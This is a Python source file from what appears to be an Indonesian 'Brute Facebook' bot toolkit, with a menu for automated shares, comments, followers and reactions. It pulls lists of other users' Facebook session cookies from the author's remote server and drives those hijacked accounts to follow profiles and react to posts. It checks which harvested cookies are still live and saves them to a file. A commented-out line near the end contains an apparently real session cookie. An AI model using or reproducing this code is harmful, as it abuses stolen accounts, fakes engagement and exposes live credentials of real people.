#######################################################
# Name           : Brute Facebook (BF)                #
# File           : asw.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 3.11                               #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, time, json, sys, datetime, re, os

from bs4 import BeautifulSoup as par
from datetime import datetime
#----------- MODULE RICH -------------
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
from rich import print as prints

#----------- MODULE RICH -------------
from data import dump as dump
from yxz.logo import Logo

N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA

class Bot_Facebook:

    def __init__(self, cookie, tokenz):
        self.xzx, self.no = [], 0
        self.ses = requests.Session()
        self.cok, self.tok = cookie, tokenz
        self.url = "https://mbasic.facebook.com"
        self.xxx = "https://api-cdn-fb.yayanxd.my.id/submit.php"

    def teksz(self):
        table = Table(title="")
        table.add_column("[bold cyan]NO.", style="bold blue")
        table.add_column("[bold green]      PILIH REACT", style="italic bold yellow", width=25)
        table.add_row("01", "Suka")
        table.add_row("02", "Super")
        table.add_row("03", "Peduli")
        table.add_row("04", "Haha")
        table.add_row("05", "Wow")
        table.add_row("06", "Sedih")
        table.add_row("07", "Marah")
        table.add_row("00", "[bold red]kembali")
        Console().print(table, justify="center", width=70)

    def menu(self):
        Logo()
        prints(Panel("""[[bold cyan]01[/]] bot auto share       [[bold cyan]04[/]] bot auto komen group
[[bold cyan]02[/]] bot auto komen       [[bold cyan]05[/]] bot like postingan
[[bold cyan]03[/]] bot followers        [[bold red]00[/]] kembali""", style="bold white", padding=(0,5), width=70, title="[bold green]MENU BOT"))
        pil = input("╰──> ")
        if pil in ["", " "]:
            prints(Panel("[[bold red]![/]] jangan kosong", style="bold white", width=70));time.sleep(2);self.menu()
        elif pil in ["1", "01"]:
            self.share()
        elif pil in ["2", "02"]:
            self.komen()
        elif pil in ["3", "03"]:
            self.dumps();self.folow()
        elif pil in ["4", "04"]:
            exit("belum tersedia")
            #self.group()
        elif pil in ["5", "05"]:
            self.dumps();print();self.teksz();self.likee()
        elif pil in ["A", "100"]:
            self.dumps();print();self.teksz();self.cek_coki()
        elif pil in ["0", "00"]:
            os.system("python run.py")
        else:
            prints(Panel("[[bold red]![/]] input yang bener", style="bold white", width=70));time.sleep(2);self.menu()

    def dumps(self):
        try:
            req = self.ses.get(f"{self.xxx}?json=true").json()
            for x in req:
                for key, value in x.items():
                    self.xzx.append(key+"|"+value)
                    sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.xzx)}{N} user... ");sys.stdout.flush()
        except:pass

    def share(self):
        prints(Panel("      [bold green]masukan link post yang mau anda pasang bot share.", style="bold white", width=70))
        link = input("╰──> ")
        prints(Panel("   [bold green]masukan limit postingan yang mau anda pasang bot share.", style="bold white", width=70))
        limi = int(input("╰──> "))
        print()
        waktu = datetime.now()
        try:
            header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
            for x in range(limi):
                self.no+=1
                post = self.ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={self.tok}",headers=header, cookies=self.cok).text
                data = json.loads(post)
                prints(data)
                if "id" in post:
                    hasil = str(datetime.now()-waktu).split('.')[0]
                    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                    for x in titik:
                        sys.stdout.write(f"\r[{H}{hasil}{N}] proses share {H}{self.no}{N} postingan{x}{N}");sys.stdout.flush()
                else:
                    prints(Panel("[bold red]gagal share postingan, kemungkinan akun terkena limit.", style="bold white", width=70));exit()
            print()
            prints(Panel(f"             [[bold green]✓[/]] berhasil share [bold green]{limi}[/] postingan             ", style="bold white", width=70))
            input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()
        except:pass

    def komen(self):
        prints(Panel("      [bold green]masukan link post yang mau anda pasang bot komen.", style="bold white", width=70))
        link = input("╰──> ")
        try:
            self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"})
            urll = self.ses.get(link).text
            cari = re.search('"MUFI","init",\[],\["(\d*)"', urll).group(1)
        except Exception:
            prints(Panel("[bold red]  gagal memasang bot komen, pastikan postingan anda publik.", style="bold white", width=70));self.komen()
        prints(Panel("[bold green]            gunakan '[bold cyan]<>[/]' untuk spasi kata2 nya...", style="bold white", width=70))
        komm = input("╰──> ").replace("<>", "\n")
        prints(Panel("   [bold green]masukan limit postingan yang mau anda pasang bot komen.", style="bold white", width=70))
        limi = int(input("╰──> "))
        print()
        waktu = datetime.now()
        try:
            header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
            for x in range(limi):
                self.no+=1
                post = self.ses.post(f"https://graph.facebook.com/{cari}/comments/?message={komm}&access_token={self.tok}",headers=header, cookies=self.cok).text
                data = json.loads(post)
                if "error" in data:
                    prints(Panel(f"[bold red]{data['error']['message']}", style="bold white", width=70, title="[bold red]ERROR"));exit()
                else:
                    hasil = str(datetime.now()-waktu).split('.')[0]
                    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                    for x in titik:
                        sys.stdout.write(f"\r[{H}{hasil}{N}] proses komen {H}{self.no}{N} postingan{x}{N}");sys.stdout.flush()
            print()
            prints(Panel(f"             [[bold green]✓[/]] berhasil komen [bold green]{limi}[/] postingan             ", style="bold white", width=70))
            input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()
        except:pass

    def folow(self):
        print();prints(Panel("Silahkan salin url akun facebook anda, yang ingin di tambah followers.", style="bold white", width=70))
        try:urll = input(f"[{O}?{N}] url akun : ");user = dump.Dump("", "").convert(urll)
        except(KeyError, IndexError):print(f"\n{N}[{M}×{N}] url tidak benar");time.sleep(3);self.folow()
        prints(Panel("    Tunggu sebentar, sendang mengirim followers ke akun anda.", style="bold white", width=70))
        for x in self.xzx:
            time.sleep(1)
            self.kirim(x.split("|")[0], x.split("|")[1], user)
        print();prints(Panel("          Bot followers berhasil di gunanakan", style="bold white", width=70))
        input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()

    def kirim(self, nama, coki, uid):
        self.no+=1
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id={uid}", cookies={"cookie":coki}).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ubah_data(urll, coki)
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": coki})
                prints(Panel(f"[[bold green]+[/]] Nama   : {nama}\n[[bold green]+[/]] Status : Akun ini berhasil mengikuti akun anda.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            elif "/a/subscriptions/remove" in str(link):
                prints(Panel(f"[[bold yellow]![/]] Nama   : {nama}\n[[bold yellow]![/]] Status : Akun ini sudah mengikuti akun anda.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            elif "/login" in str(link):
                prints(Panel(f"[[bold red]![/]] Nama   : {nama}\n[[bold red]![/]] Status : Gagal mengikuti akun anda.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            else:pass
        except requests.exceptions.TooManyRedirects:pass
        except Exception as e:prints(Panel(f"[[bold red]{e}", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"));time.sleep(3)

    def likee(self):
        cok = input("╰──> ")
        if cok in ["", " "]:print(f"[{M}!{N}] jangan kosong");time.sleep(2);self.likee()
        elif cok in ["1", "01"]:self.yuZhong("Suka")
        elif cok in ["2", "02"]:self.yuZhong("Super")
        elif cok in ["3", "03"]:self.yuZhong("Peduli")
        elif cok in ["4", "04"]:self.yuZhong("Haha")
        elif cok in ["5", "05"]:self.yuZhong("Wow")
        elif cok in ["6", "06"]:self.yuZhong("Sedih")
        elif cok in ["7", "07"]:self.yuZhong("Marah")
        elif cok in ["0", "00"]:self.menu()
        else:print(f"[{M}!{N}] input yg bnr");time.sleep(2);self.likee()

    def yuZhong(self, react):
        prints(Panel("              [italic cyan]silahkan masukan url postingan anda\n         url postingan di haruskan publik no private!", width=70))
        url = input("[?] masukan url: ").replace("https://www.facebook.com", "").replace("https://web.facebook.com", "").replace("https://m.facebook.com", "").replace("https://mbasic.facebook.com", "").replace("https://free.facebook.com", "").replace("https://mobile.facebook.com", "")
        prints(Panel(f"             [italic] Sedang Mengirim Bot [italic green]{react}[/][italic] ke postingan", width=70))
        for x in self.xzx:
            self.like_post(x.split("|")[0], x.split("|")[1], url, react)
        exit(f"selesai bot {react} ke postingan")

    def like_post(self, nama, coki, url, men):
        self.no+=1
        try:
            link = par(self.ses.get(self.url+url, cookies={"cookie": coki}).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ubah_data(urll, coki)
            elif "/reactions/picker/?is_permalink" in str(link):
                urll = re.search('href="/reactions/picker/?(.*?)"', str(link)).group(1).replace("amp;", "")
                for z in par(self.ses.get(f"{self.url}/reactions/picker/{urll}", cookies={"cookie": coki}).content, "html.parser").find_all("a"):
                    if (f"{men}(Hapus)") in z.text:
                        prints(Panel(f"[[bold red]![/]] Nama   : {nama}\n[[bold red]![/]] Status : akun ini sudah react [italic red]{men}[/] ke postingan anda.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
                    elif men in z.text:
                        xx = self.ses.get(f"{self.url}{z['href']}", cookies={"cookie": coki})
                        if "Akun Anda dibatasi saat ini" in str(xx.text):
                            status = re.findall("\<div\>Anda sementara (.*?)<", str(xx.text))[0]
                            prints(Panel(f"[[bold red]![/]] Nama   : {nama}\n[[bold red]![/]] Status : Anda sementara {status}", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
                        else:
                            prints(Panel(f"[[bold green]+[/]] Nama   : {nama}\n[[bold green]+[/]] Status : berhasil react [italic green]{men}[/] postingan anda.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
                    else:continue
            elif "/checkpoint" in str(link) or "Sorry, this content isn't available right now" in str(link) or "/login" in str(link):
                prints(Panel(f"[[bold red]![/]] Nama   : {nama}\n[[bold red]![/]] Status : gagal [italic red]{men}[/] postingan anda.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            else:pass
        except requests.exceptions.TooManyRedirects:pass
        except Exception as e:prints(Panel(f"[[bold red]{e}", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"));time.sleep(3)


# ------------------------------- CEK COKI AKTIF ----------------------
    def cek_coki(self):
        try:xxx = open("assets/coki.txt", encoding="utf8").readlines()
        except FileNotFoundError:exit("gagal")
        for id in xxx:
            kontol = id.replace("\n", "")
            titid  = kontol.split("|")
            self.Xnxx(titid[1])
        print();prints(Panel("          Bot followers berhasil di gunanakan", style="bold white", width=70))
        input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            xnxx = self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki})
            nama = re.findall('id="mbasic_logout_button">(.*?)<', str(xnxx.text))[0].replace("(", "").replace(")", "").replace("Keluar ", "").replace("Logout ", "")
            self.simpan(nama, coki)
        except:pass

    def Xnxx(self, coki):
        self.no+=1
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie":coki}).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ubah_data(urll, coki)
            try:
                nama = re.findall('id="mbasic_logout_button">(.*?)<', str(link))[0].replace("(", "").replace(")", "").replace("Keluar ", "").replace("Logout ", "")
                prints(Panel(f"[[bold green]+[/]] Nama   : {nama}\n[[bold green]+[/]] Status :[italic bold green] cookie akun ini masih aktif.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
                self.simpan(nama, coki)
            except:
                nama = "-"
                prints(Panel(f"[[bold red]-[/]] Nama   : {nama}\n[[bold red]-[/]] Status :[italic bold red] cookie akun ini tidak aktif.", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
        except requests.exceptions.TooManyRedirects:pass
        except Exception as e:prints(Panel(f"[bold red]{e}", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"));time.sleep(3)

#id="mbasic_logout_button">Keluar (Jepri)</a></td></tr></tbody></table><a

    def simpan(self, user, pasw):
        kntl = (f"{user}|{pasw}")
        with open("coki_fb.txt", "a", encoding="utf-8") as r:
            r.write(kntl+"\n")

#coki = "datr=QwUCZPjWO8W7kWiMGfXyMGAg;sb=QwUCZGBjPpKGpaIRmxYYHSrF;vpd=v1%3B868x450x1.600000023841858;dpr=1.600000023841858;m_pixel_ratio=1.600000023841858;x-referer=eyJyIjoiL2xvZ2luL2ZvcmdldF9yZWNvdmVyeS8%2FbmV4dD0lMkYlM0ZlYXYlM0RBZmFST0dXNnRHbnUyX1ZCYUtsSzFGSGlMMTN6aThKUmdNRktxWkUzZHZHbE02bXk0UkttMjZDYWxMbWlOMEs1QVVrJTI2cGFpcHYlM0QwJnBhaXB2PTAmZWF2PUFmWmc2SGFWOXFRVmxYM3JxOU9ZVVRNRTVCb2ZadFF4RVNLTHN4RGNjMFhJczM4Z092TzVVVkJuRWl1OTI4dE14QnciLCJoIjoiL2xvZ2luL2ZvcmdldF9yZWNvdmVyeS8%2FbmV4dD0lMkYlM0ZlYXYlM0RBZmFST0dXNnRHbnUyX1ZCYUtsSzFGSGlMMTN6aThKUmdNRktxWkUzZHZHbE02bXk0UkttMjZDYWxMbWlOMEs1QVVrJTI2cGFpcHYlM0QwJnBhaXB2PTAmZWF2PUFmWmc2SGFWOXFRVmxYM3JxOU9ZVVRNRTVCb2ZadFF4RVNLTHN4RGNjMFhJczM4Z092TzVVVkJuRWl1OTI4dE14QnciLCJzIjoibSJ9;locale=id_ID;wd=450x868;fr=02UPe59OGWt4PUlWV.AWW0hpscLvaf9109vHTxRLPOrko.BkB-uX.pe.AAA.0.0.BkGN2C.AWUq8qh_s-I;c_user=100090931868559;xs=23%3AFaxaIcGbN4pARw%3A2%3A1679351170%3A-1%3A-1;m_page_voice=100090931868559;"
#os.system("cls")
#Bot_Facebook("", "").cek_coki()

